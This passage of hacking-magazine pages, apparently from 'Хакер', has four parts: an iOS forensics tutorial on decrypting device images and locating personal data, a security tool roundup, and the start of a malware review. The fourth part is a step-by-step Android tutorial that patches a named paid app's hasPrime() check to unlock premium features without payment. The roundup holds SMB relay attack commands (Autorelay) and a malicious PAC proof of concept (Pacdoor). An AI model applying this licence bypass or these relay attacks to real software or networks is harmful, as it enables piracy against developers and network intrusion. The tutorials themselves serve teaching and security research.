держит. Второй раздел куда более интересен. Расположен он в /dev/disk0s2
или /dev/disk0s2s2. Содержит он пользовательские данные и данные при-
ложений, а монтируется в /private/var. Разумеется, данные здесь хранятся
в зашифрованном виде.
   Так как главный интерес для нас как мобильных криминалистов представля-
ет именно второй раздел, начнем мы с извлечения ключей шифрования, благо
iOS Forensic Toolkit это умеет (см. рис. 3).





                                    Рис. 3. Интерфейс Elcomsoft iOS Forensic Toolkit

Для извлечения нужно выбрать четвертый пункт, после чего ввести пароль до-
ступа к устройству (по умолчанию это alpine), а также ввести пасскод, если по-
следний установлен. По результатам мы получим файл keys.plist, который
содержит все необходимое для расшифровки физической копии.
  Самое время ее получить, для чего следует выбрать шестой пункт меню
(см. рис. 4).





                                                       Рис. 4. Структура разделов

Как я и говорил, мы имеем два раздела: первый без применения шифрования,
второй — с применением. Разумеется, нас интересует второй, так как именно
он содержит пользовательские данные и данные приложений. Его и выберем.
Нас спросят, куда сохранить образ, — по умолчанию это домашний каталог
пользователя. В результате мы получим файл user.dmg, который, в принципе,
уже сейчас можно смонтировать в OS X и посмотреть иерархию каталогов. Вот
только содержимое файлов увидеть не удастся. Помнишь, они же зашифрова-
ны. Но у нас есть ключ, и сейчас самое время им воспользоваться. Для этого
в iOS Forensic Toolkit предназначен седьмой пункт. Указываем путь к шифро-
ванному физическому образу и ключевому файлу и запускаем дешифрацию
(см. рис. 5).





                                          Рис. 5. Дешифрация физического образа

После ее завершения мы получим файл user-decrypted.dmg. Если мы его
смонтируем, то увидим, что на этот раз мы имеем доступ не только к иерархии
каталогов, но и к содержимому файлов (см. рис. 6).





                                         Рис. 6. Смонтированная дешифрованная
                                     физическая копия раздела с данными


Итак, расшифрованный образ готов, самое время заняться его криминалисти-
ческим анализом.

АНАЛИЗ ИЗВЛЕЧЕННЫХ ДАННЫХ
Проведем анализ данных, извлеченных на логическом уровне, так как этот
способ в настоящее время наиболее распространен (к сожалению, не всегда
у нас есть возможность извлечь данные на физическом уровне). Но все ниже-
сказанное справедливо и в отношении анализа данных, извлеченных другими
способами. Исследовать резервную копию возможно, например, при помощи
бесплатного инструмента iBackup Viewer, не считая, конечно, огромного коли-
чества специализированных криминалистических комплексов, предоставляю-
щих криминалисту возможность работать в режиме push button forensics.

ВРЕМЕННЫЕ МЕТКИ IOS
Временные метки — одни из главных помощников мобильного криминалиста.
Чаще всего в i-девайсах можно встретить временные метки в формате MAC
Absolute Time, которые представляют собой количество секунд, прошедших
с 00:00:00 1 января 2001 года. Эти метки, например, очень часто встречаются
в базах данных различных приложений, включая мессенджеры, которые обыч-
но пестрят криминалистически значимой информацией (речь о них пойдет да-
лее). Давай на них посмотрим. Откроем базу данных sms.db, выберем таблицу
message и взглянем на столбец date. В нашем случае временная метка пер-
вого сообщения — 414908416. Это и есть временная метка в формате MAC
Absolute Time. Теперь нам нужно перевести ее в понятный человеку вид. Раз-
умеется, коммерческие форензик-сьюты способны делать это автоматически
при разборе данных, но мы воспользуемся бесплатным инструментом от бри-
танцев из Digital Detective — DCode. Выбирай MAC Absolute, вставляй времен-
ную метку в соответствующее поле и жми Decode. Вуаля!





                       Рис. 7. Декодированная временная метка в формате MAC Absolute


БАЗЫ ДАННЫХ SQLITE
Обычно данные приложений в iOS хранятся в базах данных SQLite. С точки
зрения мобильной криминалистики эти базы примечательны тем, что имеют
списки свободных областей и нераспределенное пространство, в которые до-
вольно часто попадают удаленная пользователем информация. Именно бла-
годаря им у криминалистов есть возможность восстанавливать, например,
удаленную переписку, даже несмотря на то, что в их распоряжении имеются
лишь данные, извлеченные на логическом уровне. Провести анализ этих баз
данных можно, например, при помощи SQLite Database Browser. А что же де-
лать с удаленными записями? Для их восстановления есть отличный, а глав-
ное бесплатный инструмент — SQLite-Parser. Пользоваться им очень просто,
достаточно открыть терминал, перейти в каталог со скриптом (который, кста-
ти, написан на твоем любимом Python).
Если ты хочешь увидеть вывод в формате .tsv, пиши:

sqlparse.py -f /путь/к/базе_данных.db -o report.tsv

Если же тебе по душе обычный текстовый файл, то пиши:

sqlparse.py -f /путь/к/базе_данных.db -r -o report.txt

Для ярых противников командной строки есть и GUI-вариант.
   Лично я предпочитаю так называемый сырой вывод, а полученный тексто-
вый файл анализирую с помощью hex-редактора. Если ты тоже откроешь по-
лученный файл в hex-редакторе (или даже в текстовом), то увидишь, что текст
сообщений тебе уже доступен, а временные метки не так и сложно обнару-
жить, проанализировав структуру оригинальной таблицы базы данных, в на-
шем случае message. Очень скоро ты найдешь необходимые байты, которые
будут прекрасно конвертироваться в уже привычную тебе временную метку.





                                  Рис. 8. Временная метка удаленного SMS-сообщения

Давай рассмотрим наиболее важные базы данных. Начнем мы с адресной кни-
ги. Пора отправиться в HomeDomain — тут в каталоге Library/AddressBook/
ты найдешь две базы данных: AddressBook.sqlitedb и AddressBookImages.
sqlitedb. В первой базе имеются сведения не только о контактах телефонной
книги, но и о контактах из других приложений, например WhatsApp. Что же хра-
нится во второй базе? Ее название говорит само за себя: это изображения,
присвоенные тому или иному контакту.
   Теперь перейдем в WirelessDomain, а именно в Library/Call  History.
Здесь мы найдем базу данных call_history.db. Она хранит данные о по-
следних ста вызовах, будь то входящие, исходящие или пропущенные. Старые
записи удаляются, но ты же помнишь про списки свободных областей и нерас-
пределенное пространство, верно?
   Вернемся в HomeDomain, на этот раз в Library/SMS. Здесь-то мы и об-
наружим одну из наиболее значимых с криминалистической точки зрения
баз данных — sms.db. Кстати, в ней хранятся не только SMS-сообщения,
но и iMessage!
   Календарь также может включать значимые с криминалистической точ-
ки зрения события — поэтому Calendar.sqlitedb из Library/Calendar/
не стоит упускать из виду.
   Ты когда-нибудь записывал пароли от своих аккаунтов в «Заметки»? Нет?
А вот некоторые имеют такую привычку, поэтому база данных notes.sqlite
из Library/Notes/ также достойна внимания криминалиста.
   Теперь отправимся в RootDomain, где в Library/Caches/locationd/ нас
ждет база данных consolidated.db. В ней мы найдем геолокационные дан-
ные с временными метками, основанные на вышках сотовой связи и точках до-
ступа Wi-Fi, доступных для соединения.
   Хорошо, а теперь давай посмотрим на какое-нибудь популярное прило-
жение, относящееся, к примеру, к социальным сетям, скажем VK. Для этого
отправимся в AppDomain. Думал, твоя переписка в безопасности? Не тут-то
было! База данных database3.db отдаст ее всю, без остатка, а особенно-
сти SQLite позволят криминалистам извлечь из нее то, что ты тщательно стер.
Также стоит отметить массу файлов с названиями вида http_xakep.ru_0.
localstorage в Library/WebKit/WebsiteData/LocalStorage/. Это не что
иное, как сайты, которые посетил пользователь с помощью приложения. Ду-
маю, ты уже догадался, что извлечь данные можно не только из VK, но и из мно-
гих других приложений — подавляющее их большинство хранит свои данные
в SQLite-базе.

PLIST-ФАЙЛЫ
С этим форматом ты наверняка знаком еще с OS X (ведь так?). Plist-файлы
чаще всего хранят информацию о конфигурациях и настройках, причем они
могут быть как в XML-формате, так и в бинарном или просто текстовом. Если
ты используешь OS X, то провести их анализ можно при помощи Xcode или
встроенной утилиты plutil. Если же предпочитаешь работать с Windows, то мож-
но, к примеру, воспользоваться PList Explorer.
   Давай рассмотрим несколько значимых с точки зрения мобильной крими-
налистики файлов.
   Хочешь узнать последний набранный вручную номер? Легко — достаточ-
но взглянуть на com.apple.mobilephone.plist из Library/Preferences
(HomeDomain). Нужна информация о последней SIM-карте, которая исполь-
зовалась в устройстве? Добро пожаловать в WirelessDomain — Library/
Preferences/com.apple.commcenter.plist содержит эту информацию.
   Нужны  сведения  о  подключениях  к  Wi-Fi? Пора  посетить  System-
PreferencesDomain — в com.apple.wifi.plist записано все, включая времен-
ные метки последних подключений.
   А не посмотреть ли нам на последние поисковые запросы веб-браузера
Safari? Перейдем в AppDomain и взглянем на файл com.apple.mobilesafari.
plist из Library/Preferences/. Здесь мы их и найдем. Примечательно то,
что, даже если пользователь очистит историю и кеш, записи в данном файле
остаются нетронутыми.
   Поговорим немного о картах. Допустим, нам необходима информация
о последнем адресе, который пользователь искал с помощью приложения.
Для этого у нас есть plist-файл com.apple.maps.plist (AppDomain) — он-
то и содержит эту информацию, включая сведения о широте и долготе.

БАЗЫ МИНИАТЮР
Отдельного внимания заслуживают базы миниатюр — именно они позволя-
ют хоть как-то восстановить удаленные пользователем изображения, которые
могут иметь ключевое значение с точки зрения криминалистики. Это файлы
с расширением .ithmb, которые расположены в CameraRollDomain, а именно
Media/PhotoData/Thumbnails/. Просмотреть миниатюры, которые в них со-
держатся, а также экспортировать их поможет iThmb Converter.

Антикриминалистические меры

Как ты наверняка уже понял, лучшая антикриминалистическая мера — сброс
к заводским настройкам: все ключи шифрования сотрутся, и восстановить ка-
кие-либо данные едва ли представится возможным.
   Правда, если ты хранишь резервные копии любимого i-девайса на своем
компьютере — ты все еще в опасности. Более того, если ты регулярно син-
хронизируешь устройство с компьютером, то криминалисты могут найти и так
называемые lockdown-файлы, которые позволят им получить доступ к твоему
устройству, даже если ты установил надежный пасскод.


ВЫВОД
Как показывает практика, извлечь массу криминалистически значимой инфор-
мации, даже не обладая дорогостоящим программным и аппаратным обе-
спечением, вполне возможно. Несмотря на нескончаемые заверения Apple
о нерушимой безопасности их продуктов, даже пресловутая резервная копия
позволяет извлечь массу информации о пользователе устройства, его при-
вычках и действиях.
ВЗЛОМ
ЛОМАЕМ СОФТ
ДЛЯ ANDROID





  Евгений Зобнин
  zobnin@gmail.com





ЧАСТЬ 1.
КОГДА ПЛАТНОЕ СТАНОВИТСЯ БЕСПЛАТНЫМ




Ни один разговор о взломе и модификации приложений
не обходится без упоминания дизассемблера, дебаггера,
формата исполняемых файлов и вездесущей IDA Pro. Од-
нако в случае с Android все намного проще, и здесь
для вскрытия и даже внедрения кода в приложение со-
всем не обязательно использовать все эти инструменты.
Код можно легко декомпилировать обратно в Java и моди-
фицировать, используя пару простых инструментов и тек-
стовый редактор.
Этой статьей мы начинаем цикл, посвященный вскрытию
и модификации приложений для Android. Первая часть —
вводная, поэтому никакого хардкора, мы разберем-
ся в устройстве пакетов APK, научимся разбирать APK
на части, декомпилировать его код, вносить правки и со-
бирать обратно, а в качестве примера взломаем одно
популярное приложение из маркета.                                               WARNING
   Вторая статья будет целиком посвящена внедрению
бэкдора/вируса в чужое приложение. Это уже не просто      Это ознакомительная
правка нескольких строк, а глубокая модификация. Тре-        статья, призванная
                                                                               всего лишь показатьтья статья — методы обфускации и их обхода. Все боль-                                                                        процесс взлома прило-
ше разработчиков используют нетривиальную обфуска-      жений. Она не призы-
цию, чтобы осложнить жизнь реверсерам. Мы распутаем      вает тебя заниматься
                                                                       варезом и лишать дохо-их код и опять же внесем правки в приложение.                                                                        дов людей, потративших
                                                                         многие недели на со-
СНАРЯЖАЕМСЯ                                                   здание приложений.
Для выполнения описанных в статье действий понадо-     ASAP Launcher — вели-
                                                                          колепное приложение
бится ряд инструментов, и главный инструмент — это                                                                          без навязчивой рекла-
Linux. Да, многие из названных далее программ могут     мы, почти вся полезная
работать и в Windows, но в любых операциях, связан-       функциональность
                                                                             доступна бесплатно.ных с Android и его приложениями, лучше не полагаться                                                                        Поэтому вместо того,
на детище Билли. В Linux практически все сделать про-    чтобы использовать кря-
ще, командная строка здесь в разы удобнее (она нам ох      кнутую версию, лучше
                                                                            купи полное приложениекак понадобится), а некоторые инструменты просто не-
                                                                     и поддержи разработчи-
доступны для других ОС.                                                                                          ка. Оно обойдется тебе
   После установки Linux в виртуалку или второй систе-       всего в 100 рублей.
мой сразу устанавливаем средства разработки на Java
и виртуальную машину. В Ubuntu это можно сделать с по-
мощью одной команды:

$ sudo apt-get install openjdk-7-jdk

Также нам нужны четыре инструмента для распаковки и декомпиляции прило-
жений:
•  Apktool — швейцарский армейский нож для распаковки и запаковки при-
   ложений;
•  Jadx — декомпилятор байт-кода Dalvik в код на Java;
•  Backsmali — дизассемблер кода Dalvik (не пугайся, с настоящим ассем-
   блером он имеет мало общего);
•  Sign — утилита для подписи пакетов.

Для удобства создадим в домашнем каталоге подкаталог Android и скачаем
эти инструменты в него:

$ cd ~
$ mkdir ~/Android && cd ~/Android
$ wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_
    2.2.0.jar
$ wget https://github.com/skylot/jadx/releases/download/v0.6.0/jadx-
    0.6.0.zip
$ wget https://github.com/appium/sign/raw/master/dist/sign.jar
$ wget https://bitbucket.org/JesusFreke/smali/downloads/baksmali-
    2.1.3.jar
$ mkdir jadx && cd jadx
$ unzip ../jadx-0.6.0.zip

Добавим в конец файла ~/.bashrc следующие строки:

alias apktool='java -jar ~/Android/apktool_2.2.0.jar'
alias jadx-gui='~/Android/jadx/bin/jadx-gui'
alias baksmali='java -jar ~/Android/baksmali-2.1.3.jar'
alias sign='java -jar ~/Android/sign.jar'
alias javac='javac -classpath /home/j1m/Android/android-sdk-linux/
    platforms/android-23/android.jar'
alias dx='/home/j1m/Android/android-sdk-linux/build-tools/23.0.3/dx'

Они нужны для того, чтобы вместо длинных и неудобных команд вроде java
-jar ~/Android/sign.jar можно было набрать просто sign.

ВСКРЫВАЕМ ПОДОПЫТНОГО
Теперь нам нужно найти приложение, которое, во-первых, нетрудно расковы-
рять, а во-вторых, которое несет какую-то пользу и достаточно известно. То
есть брать простейшую софтину только для того, чтобы было не очень слож-
но разобраться в ее коде, мы не будем, а вместо этого устремим свой взор
на топ Play Store. Практически идеальный кандидат на эту роль — выпущенный
два месяца назад ASAP Launcher, удобнейший домашний экран с массой по-
лезных и неординарных функций.
   Для начала пройдемся по APK без использования специальных инструмен-
тов. Для этого скачаем пакет при помощи сервиса APKPure: открываем стра-
ницу приложения в Play Store, копируем URL из адресной строки и вставляем
в строку поиска на APKPure. Далее нажимаем кнопку Download APK и ждем
окончания загрузки.





                                         Страница ASAP Launcher на APKPure.com


Для удобства переименуем пакет в asap.apk:

# cd ~/Downloads
# mv ASAP\ Launcher_v1.16_apkpure.com.apk asap.apk

Разархивируем с помощью unzip:

# mkdir asap; cd asap
# unzip asap.apk

Да, APK — это обычный архив ZIP, но тем не менее он имеет четкую структуру:
•  META-INF — каталог, содержащий файлы MANIFEST.MF, CERT.MF и CERT.
   RSA. Первые два — список всех файлов пакета и их контрольных сумм, по-
   следний содержит открытый ключ разработчика и созданную с помощью
   закрытого ключа цифровую подпись файла CERT.MF. Эти данные нужны,
   чтобы при установке пакета система смогла выяснить, что пакет не был мо-
   дифицирован и действительно создан его автором. Это важно, так как, по-
    скольку нет возможности подделать цифровую подпись пакета (для этого
   нужен закрытый ключ), модифицированный пакет придется подписывать
   другим ключом;
•  res — ресурсы приложения. Здесь находятся иконка (mipmap), переводы
   строк (values), изображения (drawable), а также описания интерфейса при-
   ложения (layout). Все их можно модифицировать, чтобы изменить внеш-
   ний вид приложения. Правда, файлы XML придется сначала «разжать» —
   для улучшения производительности они хранятся в бинарном формате;
•  classes.dex — код приложения в форме байт-кода виртуальной машины
    Dalvik. Обычно приложения содержат только один такой файл, но, исполь-
    зуя директиву multiDex, разработчик может заставить среду разработки
   разбить его на множество более мелких для улучшения производительно-
    сти или преодоления ограничения на 65 536 методов в одном dex-файле;
•  AndroidManifest.xml — манифест приложения, описывающий его структу-
    ру, включая активности, сервисы, обработчики интентов и так далее. Опять
   же в формате бинарного XML.

Также пакет может содержать другие каталоги, например assets (любые фай-
лы, включенные разработчиком, в данном случае — шрифты и база данных)
и lib (нативные библиотеки, созданные с использованием Android NDK).

ИЗУЧАЕМ КОД
Само собой разумеется, просто разархивировать пакет недостаточно. Чтобы
разобраться в работе приложения, необходимо декомпилировать файл
classes.dex. Для этого мы воспользуемся jadx-gui. Запускаем, выбираем asap.
apk и видим слева список пакетов Java, включенных в APK. В данном случае
это пакеты android.support — официальная библиотека Google, реализующая
поддержку функций новых версий Android в старых (например, чтобы получить
Material Design в Android  4.1), com.google.android.gms — Google Mobile
Services, com.nispok.snakbar — реализация GUI-элемента snakbar, а также не-
сколько других.
   Основной код приложения содер-
жится  в  пакете  com.citc.asap, имен-
но такое имя носит и само приложение
в Google Store и на устройстве. Открыва-
ем его и видим больше десятка катало-
гов и множество исходников Java. Наша
задача — сделать приложение «опла-
ченным», не платя за него. Но как найти
нужный файл, реализующий проверку
на оплату? Скорее всего, он будет со-
держать в имени слово billing. Пробега-
емся по исходникам в поисках нужного
нам файла и натыкаемся на исходник
BaseBillingFragment в подкаталоге (па-
кете) fragments:
                                                              Пакеты Java





Это очень простой класс Java, в котором есть интересный метод:

protected boolean hasPrime() {
    return this.mHasPrime;
}

Все, что он делает, — просто возвращает значение поля mHasPrime, однако
интересен он не этим, а своим именем. Дело в том, что платная (точнее, опла-
ченная) версия ASAP называется Prime, и очевидно, что метод hasPrime как раз
и нужен для проверки оплаты приложения. Чтобы подтвердить свою догадку,
сохраним декомпилированные исходники (File   Save all) в каталог и попробу-
ем найти в них вызовы hasPrime():





Совпадений  немного,  основной  «пользователь»   hasPrime() —  это
SettingsFragment, то есть исходник, отвечающий за формирование окна на-
строек. Учитывая, что Prime-версия отличается от бесплатной именно тем,
что в ней разблокированы дополнительные поля настроек, уже сейчас мы мо-
жем быть на 90% уверены, что hasPrime() — нужный нам метод. Скорее всего,
именно с его помощью приложение выясняет, куплена ли Prime-версия. Оста-
лось только убедиться в этом окончательно, подменив код метода на свой.

ВНОСИМ ПРАВКИ
Метод hasPrime() очень прост, он возвращает значение поля mHasPrime, кото-
рое имеет тип boolean. Нетрудно предположить, что в случае, если приложе-
ние оплачено, hasPrime() вернет true, иначе вернет false. Наша задача — сде-
лать так, чтобы метод всегда возвращал true и остальная часть приложения
думала, что приложение оплачено, и разблокировала дополнительные опции
в окне настроек.
   К сожалению, сделать это с помощью прямой правки исходного кода не по-
лучится, приложение нельзя скомпилировать обратно. Однако никто не запре-
щает дизассемблировать код, внести правки и собрать его вновь. И как раз
здесь нам понадобится apktool. Дизассемблируем APK:

$ apktool d -r asap.apk

В текущем каталоге появится подкаталог asap. Открываем файл *asap/smali/
com/citc/asap/fragments/BaseBillingFragment.smali* и находим hasPrime, де-
кларация метода будет выглядеть так:

.method protected hasPrime()Z
    .locals 1
    .prologue
    .line 167
    iget-boolean v0, p0, Lcom/citc/asap/fragments/BaseBilling
        Fragment;->mHasPrime:Z
    return v0
.end method

Это и есть дизассемблированный листинг, и, как ты видишь, он на порядок
проще, чем дизассемблированный код нативных приложений. В целом здесь
все тривиально:
•  .method protected hasPrime()Z — объявляет protected-метод, который
   возвращает значение типа boolean (Z);
•  .locals 1 — говорит виртуальной машине, что метод использует в своей
   работе один регистр (в данном случае он будет содержать возвращаемое
    значение);
•  .prologue и .line 167 — директивы, необходимые для отладки, на ход ис-
   полнения не влияют;
•  iget-boolean v0, p0 ... — получает значение поля типа boolean и запи-
   сывает в регистр v0, регистр p0 — это нулевой параметр, он всегда равен
   имени класса (this);
•  return v0 — возвращает значение регистра v0;
•  .end method — закрывает тело метода.

Теперь мы должны изменить данный метод так, чтобы он возвращал true не-
зависимо от значения поля mHasPrime. Мы могли бы сделать это вручную,
но проще написать новый метод на Java:

public class Test {
    public boolean hasPrime() {
        return true;
    }
}

И пропустить его через компилятор и дизассемблер:

$ javac Test.java
$ dx --dex --output=Test.dex Test.class
$ baksmali Test.dex

На выходе получаем следующий ассемблерный код:

.method protected hasPrime()Z
    .registers 1
    const v0, 1
    return v0
.end method

Ты уже должен сам догадаться, что он объявляет константу v0 со значением 1
и возвращает ее (в Dalvik тип boolean — это int, который может иметь значение
1 — true или 0 — false). Осталось только вставить этот код вместо оригиналь-
ного и собрать пакет обратно:

$ apktool b asap

Пакет появится в каталоге asap/dist. Переименуем его, что-
бы не запутаться:

$ mv asap/dist/asap.apk asap-fake-hasPrime.apk

И подпишем с помощью тестового ключа:
                                    WWW
$ sign asap-fake-hasPrime.apk                                                                         Официальная
                                                                             документация
В результате в текущем каталоге появится файл asap-fake-     по ассемблерно-
hasPrime.s.apk. Остается только закинуть его на карту памя-      му коду Dalvik
ти и установить, удалив перед этим оригинальное приложе-
ние.





                 Настройки ASAP Launcher до и после манипуляций

ВЫВОДЫ
Взломать приложение для Android очень и очень просто. Да, я не спорю, нам
попался удобный и простой пример для модификации, но опять же повто-
рюсь — это весьма популярное приложение, о котором рассказывали на боль-
шинстве сайтов, посвященных Android.
   Большинство других приложений вскрыть так же просто, однако есть до-
статочное количество экземпляров, пропущенных через обфускаторы и раз-
личные системы защиты. С ними все несколько сложнее, и таким приложени-
ям будет посвящена третья статья цикла. Во второй статье мы рассмотрим,
как тот же самый метод модификации использовать для внедрения собствен-
ного кода.
ВЗЛОМ





                                 Дмитрий «D1g1» Евдокимов,
                                                                Digital Security
                                               @evdokimovds





СОФТ ДЛЯ ВЗЛОМА И АНАЛИЗА БЕЗОПАСНОСТИ





                         WARNING

                                    Внимание! Информация
                                          представлена
                                     исключительно с целью
                                     ознакомления! Ни авторы,
                                     ни редакция за твои
                                    действия ответственности
                                           не несут!





                     Autorelay
                            Autorelay — скрипт на Python для организации авто-
                       матизированной атаки SMB relay как на локальные,
                           так и на удаленные устройства. Инструмент исполь-
                          зует Responder для отравления, Metasploit для HTTP
                   NTLM relay и Snarf для проведения MITM-атаки.
                    При работе локально требуется только интерфейс
                      и XML-файл Nmap или список IP-адресов для це-
                       левой сети, чтобы определить SMB-хосты. При ис-
                       пользовании для SMB relaying на JumpBox необхо-Автор:
                     дим IP-адрес JumpBox.Dan McInerney
                       Локальное использование:
URL:
                        $ sudo ./autorelay.py -x local-network.xmlgithub.com/danmcinerney/
                            -i eth0autorelay
                        $ sudo ./autorelay.py -l ips.txt -i eth0 **
                            -l option needs some wee fixing **Система:
Linux
                       Удаленное использование:

                        $ sudo ./autorelay.py -x remote-network.xml
                            -i eth0 -r 95.34.53.243
                        $ sudo ./autorelay.py -l ips.txt -i eth0
                            -r 95.34.53.243




                   Pacdoor
                       Pacdoor — это proof of concept вредоносного кода
                       на JavaScript в виде Proxy Auto-Configuration (PAC)
                       файла. Pacdoor имеет два канала взаимодействия,
                       возможность извлекать HTTPS URLs и отключать до-
                          ступ к определенным URL.
                           Устанавливается (для этого потребуется Python
                              2.7.x) следующим образом:

                        $ git clone https://github.com/SafeBreach-Авторы:
                            Labs/pacdoor.gitItzik Kotler, Amit Klein
                        $ cd pacdoor
                        $ cd serverURL:
                        $ pip install -r requirements.txtgithub.com/SafeBreach-
Labs/pacdoor
                       Инструмент впервые был представлен на конфе-
                      ренции Black Hat USA 2016 в презентации CripplingСистема:
                    HTTPS with unholy PAC (pdf).Windows/Linux/Mac



                    Santa
                       Популярность macOS растет, растет и интерес
                            к ней — как злоумышленников, так и исследовате-
                          лей. В итоге обнаруживаются все новые уязвимо-
                         сти и вредоносный код для нее. Santa — это систе-
                    ма белых и черных списков исполняемых файлов
                       для macOS. Как ты мог заметить, проект находится
                        в репозитории Гугла, однако это не официальный
                        проект Google.
                         Состав инструмента:Авторы:
                         •  kernel extension, которое следит за выполнениемnot an official Google
                          программ;
                         •  userland daemon, который принимает решениеURL:
                        о выполнении или невыполнении программыgithub.com/google/santa
                          на основании данных SQLite базы данных;
                         •  GUI agent, который уведомляет пользователяСистема:
                        о случаях блокирования приложения;Mac
                         •  command-line — утилита для управления систе-
                       мой и синхронизацией базы данных с сервером.

                      Особенности управления:
                         •  два режима работы: MONITOR и LOCKDOWN;
                         •  логирование всех событий;
                         •  правила на основе сертификатов;
                         •  правила на основе путей файлов.

                      Более подробную документацию смотри на стра-
                        ничке проекта.




                 Ядерный фаззинг
                       Уязвимости в ядре операционных систем всегда
                      вызывают большой интерес — начиная с поднятия
                       привилегий и обхода ограничений песочниц вплоть
                      до удаленного выполнения кода в системе. Искать
                        уязвимости в ring 0 части — это не то же самое, что
                      и в ring 3 части. При этом не стоит забывать, что ring
                      0 Windows отличается от ring 0 Linux и тем более QNX
                              и, таким образом, к каждой операционной системе
                       нужен свой подход.Авторы:
                             KernelFuzzer — это кросс-платформенный фрей-James Loureiro, Georgi
                      мворк для фаззинга ядра, написанный на С.Geshev
                        Основные компоненты:
                         •  база знаний по системным вызовам — взаимо-URL:
                          действие user- и kernel-пространства;github.com/mwrlabs/
                         •  хранилище объектов — интересные объектыKernelFuzzer
                          для фаззинга;
                         •  ядро системы — в основном механизмы ловлиСистема:
                         и обработки падений;Windows, macOS, QNX
                         •  вспомогательные функции — для создания, за-
                          полнения и возвращения валидных структур;
                         •  база знаний по OS API — для взаимодействия
                          с системными библиотеками (доступ к файлам,
                           пользовательский интерфейс, графика и муль-
                           тимедиа, устройства, сеть);
                         •  значения для фаззинга — значения различных
                           типов данных (boolean, integer, float и другие).

                     Данный фаззер был протестирован на Windows
                          7/10, OS X и QNX. Но, как бы то ни было, в первую
                       очередь авторы при создании этого инструмента
                     были нацелены на Windows. Более подробно об ин-
                        струменте можно узнать из презентации Platform
                          Agnostic Kernel Fuzzing (pdf).




                    Raptor WAF
                         Raptor — это файрвол для веб-приложений, напи-
                       сан на С с использованием DFA (deterministic finite
                          automation) и нацелен на блокирование SQL-инъек-
                         ций, cross site scripting и path traversal.
                        Начнем с небольшого примера использования/
                        проверки.
                             1. Поднимем HTTPd-сервер на 80-м порту и запу-
                         стим raptor:
Авторы:                        $ bin/Raptor -h localhost -p 80 -r 8883Antonio «CoolerVoid» Costa
                            -w 4 -o loglog.txt
URL:                             2. Копируем уязвимый PHP-код в нашу веб-дирек-github.com/CoolerVoid/
                        торию на сервере:raptor_waf

                        $ cp doc/test_dfa/test.php /var/www/html
Система:
Linux
                             3. Начинаем тестировать различные атаки по адре-
                            су http://localhost:8883/test.php.
                             4. ???
                             5.  Profit!

                       Прелесть этого Waf заключается в том, что он напи-
                       сан на С и его можно собрать, в принципе, на любую
                         архитектуру (ARM, MIPS и так далее), — главное,
                       чтобы были GCC и make. Текущая версия активно
                         тестируется на ОС Linux.
                          Также хочется сказать, что есть поддержка чер-
                       ных списков для IP-адресов, поддержка IPv4 и IPv6,
                       некоторые наработки по защите от DoS, работа
                       с SSL/TLS.
                        Более подробно о проекте можно узнать в доку-
                      ментации (pdf).




                   Тестируем iOS-приложения
                   Я думаю, все, кто занимается безопасностью мо-
                       бильных приложений, знакомы с прекрасным ин-
                       струментом — фреймворком drozer для ОС Android.
                     К сожалению, долгое время не хватало подобного
                        инструмента для iOS. И вот совсем недавно на свет
                       появилась тулза от тех же ребят — инструмент под
                       названием Needle.
                           Needle — это фреймворк для оценки безопас-
                        ности iOS-приложений, написанный на Python и ба-Авторы:                      зирующийся на множестве вспомогательных ути-Marco Lancini
                          лит (для организации полного цикла) и фреймворке
                        для перехвата функций Frida. Инструмент уже под-URL:                       держивает как iOS 8, так и iOS 9. Для джейлбрейкну-github.com/mwrlabs/needle
                          того устройства необходимы Cydia, OpenSSH, Apt 0.7
                                   Strict. В качестве машины для анализа подойдет KaliСистема:                       или macOS. В ближайшее время разработчики обе-iOS
                    щают еще и предоставление Docker-контейнера.
                          Needle работает по тем же принципам, что
                      и drozer, с такой же CLI-строкой. Для старта доста-
                        точно указать Bundle ID целевого приложения и па-
                      раметры для подключения к устройству.
                        Основные функции:
                         •  выполнение локальных команд;
                         •  shell-доступ на устройстве;
                         •  выполнение команд на устройстве;
                         •  загрузка и выгрузка с устройства файлов;
                         •  автоконфигурация;
                         •  модульный подход;
                         •  выполнение задач в фоне.
                        Основные классы проверок:
                         •  анализ свойств бинарных файлов;
                         •  анализ хранилища данных;
                         •  динамический анализ приложения;
                         •  перехват функций;
                         •  анализ каналов передачи данных;
                         •  статический анализ кода.

                   Можно с уверенностью сказать, что это must have
                       инструмент для оценки безопасности iOS-прило-
                        жений.
MALWARE
    ЛЕТНЯЯ


                                                                          Павел Шалин
                                                                                               аналитик,
                                                                                       «Доктор Веб»   МАЛВАРЬ
       2016:
    СВЕЖАЯ,
    ГОРЯЧАЯ,
      ТВОЯ
  ОБЗОР САМЫХ ИНТЕРЕСНЫХ ВРЕДОНОСОВ
  ЗА ПОСЛЕДНИЕ ТРИ МЕСЯЦА





Большинство вредоносных программ, которые ежедневно
попадают в нашу вирусную лабораторию, не представля-
ют для аналитиков особого интереса. Как говорится, все
новое — это либо накрытое упаковщиком старое, либо
слегка модифицированные образцы, позаимствованные
кем-то из паблика. Изредка среди этого бесконечного
потока попадается что-то по-настоящему любопытное —
семпл, который можно обсудить с коллегами в курилке.
Ну или рассказать о нем читателям журнала «Хакер».

САМОРАСПРОСТРАНЯЮЩИЕСЯ ЛИНУКС-ТРОЯНЫ
Троянами для Linux сейчас никого не удивишь: в последнее время таких ста-
новится все больше. Не потому, что бородатые линуксоиды и их личные ком-
пы стали вдруг жутко интересны вирусописателям, отнюдь. Разработчики вре-
доносных программ — ребята прагматичные, их в первую очередь волнует
прибыль. А под управлением различных модификаций Linux сейчас работает
несметное число всевозможных мелких девайсов: роутеры, телеприставки,
сетевые хранилища, мясору... Стоп, мясорубок на Linux я еще не видел. В об-
щем, весь этот электронный зоопарк и оказывается первоочередной целью
для создателей троянов. Вторая цель — веб-сайты.
   Как создается подавляющее большинство корпоративных сайтов в нашей
благословенной стране? Обычно руководитель компании решает открыть
представительство своей фирмы в интернете потому, что у конкурентов уже
есть, а у него еще нет. Пишет на коленке что-то вроде технического задания
(хотя чаще обходится и без этого), обращается в модное дизайнерское агент-
ство, изучает прайс, шевелит бровями и в конце концов нанимает знакомого
студента за пятьдесят долларов. Тот качает бесплатный WordPress, натягивает
на него крякнутый шаблон с торрента и заливает все это на хостинг. Хорошо,
если догадается сменить дефолтный пароль администратора. Обновления
CMS? Не, не слышали. Вывод напрашивается сам собой: такие интернет-ре-
сурсы — лакомый кусок для любого уважающего себя вирмейкера.
  Именно взлом сайтов, работающих под управлением движков Drupal,
WordPress, Magento, JetSpeed и некоторых других, задуман основной
функцией троянца Linux.Rex.1. Остальные функции — это рассылка писем
